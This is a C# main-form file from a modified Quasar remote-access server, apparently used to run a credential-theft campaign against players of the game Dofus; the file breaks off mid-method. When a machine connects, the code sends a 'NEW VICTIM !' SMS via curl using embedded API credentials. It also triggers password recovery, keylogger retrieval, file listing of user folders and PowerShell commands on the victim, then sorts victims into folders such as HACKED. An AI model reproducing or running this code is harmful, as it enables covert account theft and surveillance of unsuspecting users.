using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Server.Extensions;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.Text;

namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            RegisterMessageHandler();
            InitializeComponent();
        }

        /// <summary>
        /// Registers the client status message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
        }

        /// <summary>
        /// Unregisters the client status message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
               {
                   int selected = lstClients.SelectedItems.Count;
                   this.Text = (selected > 0)
                       ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                           selected)
                       : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
               });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!System.IO.File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));

            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;

            var result = serverCsp.ExportParameters(false);
            var result2 = connectedCsp.ExportParameters(false);

            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/

            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();

            //Sort by Tag
            ListViewColumnSorter lvwColumnSorter = new ListViewColumnSorter();
            this.lstClients.ListViewItemSorter = lvwColumnSorter;
            lvwColumnSorter.SortColumn = 1;
            lvwColumnSorter.Order = SortOrder.Ascending;
            this.lstClients.Sort();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
               {
                   if (!listening)
                       lstClients.Items.Clear();
                   listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
               });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }

                //  _____   ____  ______ _    _  _____ 
                // |  __ \ / __ \|  ____| |  | |/ ____|
                // | |  | | |  | | |__  | |  | | (___  
                // | |  | | |  | |  __| | |  | |\___ \ 
                // | |__| | |__| | |    | |__| |____) |
                // |_____/ \____/|_|     \____/|_____/ 

                ////Creation Dossiers Client
                Directory.CreateDirectory(client.Value.DownloadDirectory);

                //Creation Dossiers Tri
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../HACKED");
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../NEW");
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../NODOFUS");
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER SHIELD");
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../A VIDER AUTH");
                Directory.CreateDirectory(client.Value.DownloadDirectory + "/../../LOUPE");

                //Envoi SMS
                WshShell shell = new WshShell();
                String msg = "NEW VICTIM !" +
                        "%0A" + client.Value.UserAtPc +
                        "%0A" + client.Value.Country
                        ;
                String smscommand = "curl -L \"https://smsapi.free-mobile.fr/sendmsg?user=17391631&pass=Llbx1K910z0dVL&msg=" + msg + "\"";

                //Creation raccourci si nouveau
                String shortcutName = client.Value.UserAtPc + "_" + client.Value.Id.Substring(0, 7) + ".lnk";
                if (!System.IO.File.Exists(client.Value.DownloadDirectory + "/../../HACKED/" + shortcutName) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName)) && !(System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
                {
                    //WshShell shell = new WshShell();
                    IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName);
                    shortcut.TargetPath = client.Value.DownloadDirectory;
                    shortcut.Save();
                    shell.Exec(smscommand);
                }




                ////Note détails pigeon dans fichier INFOS.txt
                //using (FileStream fs = System.IO.File.Create(client.Value.DownloadDirectory + "\\OS.txt"))
                //{
                //    Byte[] info = new UTF8Encoding(true).GetBytes(
                //        client.Value.OperatingSystem);
                //    // Add some information to the file.
                //    fs.Write(info, 0, info.Length);
                //}

            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
               {
                   var item = GetListViewItemByClient(client);
                   if (item != null)
                       item.ToolTipText = text;
               });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                String shortcutName = client.Value.UserAtPc + "_" + client.Value.Id.Substring(0, 7) + ".lnk";
                System.Drawing.Color co = System.Drawing.Color.White;
                //SET TAG
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NEW/" + shortcutName)))
                {
                    client.Value.Tag = "2. NEW";
                    co = System.Drawing.Color.LightGreen;
                }
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../HACKED/" + shortcutName)))
                {
                    client.Value.Tag = "3. HACKED";
                    co = System.Drawing.Color.LightGoldenrodYellow;
                }
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)))
                {
                    client.Value.Tag = "1. SHIELD";
                    co = System.Drawing.Color.LightPink;
                }
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)))
                {
                    client.Value.Tag = "0. AUTH";
                    co = System.Drawing.Color.Cyan;
                }
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
                {
                    client.Value.Tag = "4. NODOFUS";
                    co = System.Drawing.Color.LightGray;
                }
                if ((System.IO.File.Exists(client.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName)))
                {
                    client.Value.Tag = "5. LOUPE";
                    co = System.Drawing.Color.Cyan;
                }

                client.Value.Version = "-";
                client.Value.AccountType = "0";

                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                })
                { Tag = client, ImageIndex = client.Value.ImageIndex };

                lvi.BackColor = co;


                lstClients.Invoke((MethodInvoker)delegate
               {
                   lock (_lockClients)
                   {
                       lstClients.Items.Add(lvi);

                        //  _____   ____  ______ _    _  _____ 
                        // |  __ \ / __ \|  ____| |  | |/ ____|
                        // | |  | | |  | | |__  | |  | | (___  
                        // | |  | | |  | |  __| | |  | |\___ \ 
                        // | |__| | |__| | |    | |__| |____) |
                        // |_____/ \____/|_|     \____/|_____/ 

                        Client[] clients = new Client[] { client };


                        //passwords
                        FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                       frmPass.RecoverPasswords();

                       ////logs
                       FrmKeylogger frmKeylogger = FrmKeylogger.CreateNewOrGetExisting(client);
                       frmKeylogger._keyloggerHandler.RetrieveLogs();

                       ////infos system
                       FrmSystemInformation frmSi = new FrmSystemInformation(client);
                       frmSi._sysInfoHandler.RefreshSystemInformation();

                        //files
                        FrmFileManager frmFM = new FrmFileManager(client);
                       frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users");
                       frmFM._fileManagerHandler.GetDirectoryContents("C:\\Windows\\Temp");

                       //Current Window
                       FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(client);
                       client.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
                       client.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
                       frmRs.WindowState = System.Windows.Forms.FormWindowState.Minimized;
                       frmRs.Show();
                       frmRs.Hide();

                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\Dofus");
                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap");
                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\keydata");
                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\zaap\\certificate");
                       //frmFM._fileManagerHandler.GetDirectoryContents("C:\\Users\\" + client.Value.Username + "\\AppData\\Roaming\\AnkamaCertificates\\v2-RELEASE");

                       //frmFM._fileManagerHandler.BeginUploadFile("pssuspend.exe", "C:\\pssuspend.exe");

                   }
               });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
               {
                   lock (_lockClients)
                   {
                       foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                           .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                       {
                           lvi.Remove();
                           break;
                       }
                   }
               });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[STATUS_ID].Text = text;
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();

        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
           {
               itemClient = lstClients.Items.Cast<ListViewItem>()
                   .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
           });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nUser@PC: {1}", c.EndPoint.Address.ToString(),
                        c.Value.UserAtPc), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.WindowState = System.Windows.Forms.FormWindowState.Maximized;
                frmRs.Show();                
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
            }
        }

        #endregion

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
                frmKl.Show();
                frmKl.Focus();
            }
        }

        #endregion

        #region "User Support"

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion

        #region "Shortcuts"

        private void lstClients_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    foreach (Client c in GetSelectedClients())
                    {
                        if (!Directory.Exists(c.Value.DownloadDirectory))
                            Directory.CreateDirectory(c.Value.DownloadDirectory);

                        Process.Start(c.Value.DownloadDirectory);
                    }
                }
            }
            else if (e.KeyChar == "k"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmKeylogger frmKL = FrmKeylogger.CreateNewOrGetExisting(c);
                    frmKL.Show();
                }
            }
            else if (e.KeyChar == "d"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRemoteDesktop frmRDP = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                    frmRDP.Show();
                }
            }
            else if (e.KeyChar == "p"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                    frmRS.Show();
                }
            }
            else if (e.KeyChar == "f"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmFileManager frmFM = FrmFileManager.CreateNewOrGetExisting(c);
                    frmFM.Show();
                }
            }
            else if (e.KeyChar == "x"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    Process.Start(c.Value.DownloadDirectory + "\\passwords.txt");
                }

            }
        }

        #endregion

        private void lstClients_KeyPress_1(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    foreach (Client c in GetSelectedClients())
                    {
                        if (!Directory.Exists(c.Value.DownloadDirectory))
                            Directory.CreateDirectory(c.Value.DownloadDirectory);

                        Process.Start(c.Value.DownloadDirectory);
                    }
                }
            }
            else if (e.KeyChar == "k"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmKeylogger frmKL = FrmKeylogger.CreateNewOrGetExisting(c);
                    frmKL.Show();
                }
            }
            else if (e.KeyChar == "d"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRemoteDesktop frmRDP = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                    frmRDP.Show();
                }
            }
            else if (e.KeyChar == "p"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                    frmRS.Show();
                }
            }
            else if (e.KeyChar == "f"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmFileManager frmFM = FrmFileManager.CreateNewOrGetExisting(c);
                    frmFM.Show();
                }
            }
            else if (e.KeyChar == "x"[0])
            {
                foreach (Client c in GetSelectedClients())
                {
                    Process.Start(c.Value.DownloadDirectory + "\\passwords.txt");
                }

            }
        }

        private void statusStrip_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void deleteShortcuts(Client c)
        {
            String shortcutName = c.Value.UserAtPc + "_" + c.Value.Id.Substring(0, 7) + ".lnk";
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../A VIDER AUTH/" + shortcutName);
            }
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../A VIDER SHIELD/" + shortcutName);
            }
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../NODOFUS/" + shortcutName);
            }
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../HACKED/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../HACKED/" + shortcutName);
            }
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../NEW/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../NEW/" + shortcutName);
            }
            if ((System.IO.File.Exists(c.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName)))
            {
                System.IO.File.Delete(c.Value.DownloadDirectory + "/../../LOUPE/" + shortcutName);
            }
        }

        private void moveClient(string path)
        {
            foreach (Client c in GetSelectedClients())
            {
                //Remove client from list view
                RemoveClientFromListview(c);

                //Suppression raccourcis
                deleteShortcuts(c);

                //Creation nouveau raccourci
                WshShell shell = new WshShell();
                String shortcutName = c.Value.UserAtPc + "_" + c.Value.Id.Substring(0, 7) + ".lnk";
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(c.Value.DownloadDirectory + path + shortcutName);
                shortcut.TargetPath = c.Value.DownloadDirectory;
                shortcut.Save();

                //Addclienttolistview
                AddClientToListview(c);
            }
        }

        private void nEWToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../NEW/");
        }

        private void aVIDERAUTHToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../A VIDER AUTH/");

        }
        private void aVIDERSHIELDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../A VIDER SHIELD/");
        }

        private void hACKEDToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../HACKED/");
        }

        private void nODOFUSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../NODOFUS/");
        }

        private void lOUPEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            moveClient("/../../LOUPE/");
        }



        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (Client c in GetConnectedClients())
            {
                var item = GetListViewItemByClient(c);
                if (item != null)
                {
                    item.SubItems[3].Text = c.Value.Version;
                    item.SubItems[8].Text = c.Value.AccountType;
                    if (c.Value.AccountType != "0")
                    {
